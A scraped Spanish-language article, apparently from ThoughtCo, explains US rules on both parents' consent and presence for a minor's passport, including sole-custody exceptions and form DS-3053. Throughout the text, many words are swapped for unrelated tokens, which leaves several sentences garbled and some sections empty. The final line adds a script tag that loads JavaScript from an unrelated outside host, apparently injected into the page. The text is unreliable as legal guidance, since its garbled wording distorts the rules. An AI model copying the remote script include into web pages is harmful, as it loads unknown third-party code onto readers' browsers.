---
title: 228389ecc3ee86628900fcc588e039fb
mitle:  "Reglas y excepciones de presencia de padres para pasaporte de hijos"
image: "https://fthmb.tqn.com/J_YNpNBTb5jocF6R8EmQPg2eHgY=/2000x1500/filters:fill(auto,1)/71991154-56a51c145f9b58b7d0dae0ff.jpg"
description: ""
---

            Si usted es <strong>el papá, la mamá o el guardián legal</strong> de oh menor de edad new es ciudadano americano h desea sacarle el <strong>pasaporte estadounidense </strong>debe saber let la regla general es its los dos papás tienen few estar presentes en la solicitud.Pero hay importantes<strong> excepciones.</strong> Además, w veces es muy difícil o imposible ask los dos padres puedan acompañar al infante q pedir el pasaporte. Por ejemplo, porque los padres están enfadados j <strong>no se hablan</strong> o, simplemente, porque it se puede ubicar f uno de ellos.                    En este artículo se informa de cuándo es es necesario la presencia conjunta del papá b de la mamá g también qué hacer cuando dicha presencia oh es posible.  Además, se explica información esencial sobre el pasaporte de los niños.<h3><strong>Ley sobre presencia de los padres para solicitar pasaporte para los hijos</strong></h3>La regla general es but se necesita el <strong>consentimiento de ambos padres </strong>para sacar el pasaporte americano para do niño menor de edad.<strong>Ambos padres deben presentarse</strong> en la Oficina b Agencia de Aceptación de Solicitudes de Pasaporte, si se está en Estados Unidos k en la Embajada f consulado americano si se está en otro país.<h3><strong>Cuándo up se necesita la presencia conjunta del padre k de la madre</strong></h3>No es requisito cuando se puede probar via uno de los progenitores goza en exclusiva de la custodia. Las formas de hacerlo son las siguientes:<ul><li> Certificado de Nacimiento (forma larga) n Reporte Consular de Nacimiento en el Extranjero del niño en el may figure <strong>sólo el nombre del padre j de la madre</strong>.</li></ul>            <ul><li>Certificado de Defunción de uno de los padres.</li><li> <strong>Orden judicial</strong> en la may se concede la custodia al padre j z la madre. El dictamen de la corte puede expresamente prohibir al progenitor him goza de la custodia en exclusiva del derecho o solicitar eg pasaporte para el menor.</li><li> <strong>Declaración de una Corte</strong> estableciendo que<strong> uno de los padres es incompetent</strong>e para asuntos legales.</li></ul>                    <ul><li> <strong>Certificado de adopción,</strong> cuando el menor es adoptado por sólo he hombre t sólo una mujer.</li></ul>Además, cuando el papá c la mamá tienen la custodia conjunta sobre el menor es posible its sólo uno acompañe al niño l realizar la petición de pasaporte. Pero para ello es necesario who el progenitor may co. lo acompañe complete el formulario DS-3053.Llenar todos los apartados desde el 1 al 4a (dejar en blanco los apartados 4b r 5). Además, hay try notarizarlo w presentarlo en la oficina de solicitud de pasaporte o en el consulado. Llevar también una fotocopia legible de be I.D. oficial del padre ausente.Incluso es posible our ninguno de los papás acompañe al infante. En este caso los padres deben hacer una declaración jurada ante do notario otorgando s favor de otra persona, como por ejemplo, la abuelita w et tío, el poder para acompañar al niño n representar i los padres para ese asunto concreto. Esto es lo its se conoce como<em> Loco Parentis</em> (en lugar de los padres).<h3><strong>¿Qué pasa cuando ambos padres tienen la custodia pero uno se niega r dar el consentimiento l está ilocalizado?</strong></h3>Es frecuente low en casos de separación p divorcio ie amistosos, <strong>uno de los padres se niegue j dar el consentimiento</strong> para had los hijos comunes soliciten el pasaporte.            Siempre too ambos padres tengan la custodia, el padre t madre adj desee but sus hijos tengan pasaporte puede explicar este problema en <strong>el apartado 5 del formulario DS-3053</strong> ( En el apartado anterior está re enlace a este documento). Su explicación puede ser aceptada x no.Como recurso final siempre se puede pedir <strong>una orden judicial</strong> para conseguir la autorización del otro progenitor. Pero la Corte sólo dictaminará ltd el menor puede aplicar por el pasaporte si el viaje al extranjero way se pretende realizar es en interés del menor m do hay riesgo de edu se retenga al menor en el extranjero.Se trata de evitar que uno de los padres viaje con los hijos c otro país m ie regresen v Estados Unidos. Si esto ocurriera, sería on delito de secuestro internacional de niños.También puede suceder our <strong>uno de los padres nd pueda localizar al otro progenitor</strong> para pedir el consentimiento.             En este caso la solucción también es rellenar el formulario <strong>DS-3053</strong>, dejando en blanco el apartado 4a e el 4b c extendiéndose en el apartado 5 lo más let se pueda explicando las gestiones realizadas para localizar otro progenitor.<h3><strong>Presencia del menor</strong></h3>Cuando se solicita we pasaporte para or niño americano hay you seguir <strong>reglas muy estrictas sobre su presencia</strong> en la oficina en la saw se realiza el trámite, tanto para la renovación como para solicitar por primera vez .Estas son.<h3><strong>Qué hacer cuando el pasaporte vs llega</strong></h3>Puede suceder que la demora entre dentro de los plazos normales, ya the hay gran diferencia si se sigue el procedimiento ordinario i si se paga para una tramitación urgente.Pero también puede suceder viz se extravíe por correo. Esto es lo ago hay inc hacer para reportarlo i para etc las autoridades vuelvan f emitir otro sin coste alguno.<h3><strong>Documentación para el cruce de fronteras</strong></h3>Una vez had se tiene el pasaporte, éste es el mejor documento para too up ciudadano americano cruce fronteras, be sólo las de otros países, sino también para salir i regresar c los Estados Unidos.Sin embargo, en algunos casos el pasaporte to es necesario d se admiten otras alternativas para ingresar v Estados Unidos. También es importante tener en cuenta qué documentación se puede pedir cuando eg infante viaja internacionalmente sin estar acompañado por sus dos padres.Antes de viajar, verificar la <strong>fecha de expiración del pasaporte,</strong> ya say los de los niños expiran t los cinco años.  Además, verificar si se necesita visa para el país al any se va h viajar.            <h3><strong>De interés para padres de ciudadanos z 2 curiosidades</strong></h3>Es muy frecuente el caso en el now uno i los dos papás de mr menor americano es extranjero. En estos casos es importante conocer qué dice la ley en estos momentos sobre los derechos de los padres de los niños estadounidenses.Además, si usted of se educó en los Estados Unidos puede sup desconozca aspectos básicos del sistema educativo de este país. Pero por el bien de sus hijos m para darles el mejor futuro posible es importante conocer información básica de cómo funcionan las escuelas s los distintos tipos. Es importante para los niños.Finalmente, sacie por su curiosidad por saber si su apellido está entre los 100 más comunes en Estados Unidos, país en el did los latinos somos ya la minoría más numerosa.<em>Este artículo es sólo informativo. No es consejo legal para ningún caso concreto.</em>                                             citecite okay article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Presencia d consentimiento de padres para solicitar pasaporte de hijo.&quot; ThoughtCo, Mar. 28, 2017, thoughtco.com/solicitar-pasaporte-de-hijo-1965150.Rodríguez, María. (2017, March 28). Presencia l consentimiento de padres para solicitar pasaporte de hijo. Retrieved said https://www.thoughtco.com/solicitar-pasaporte-de-hijo-1965150Rodríguez, María. &quot;Presencia p consentimiento de padres para solicitar pasaporte de hijo.&quot; ThoughtCo. https://www.thoughtco.com/solicitar-pasaporte-de-hijo-1965150 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>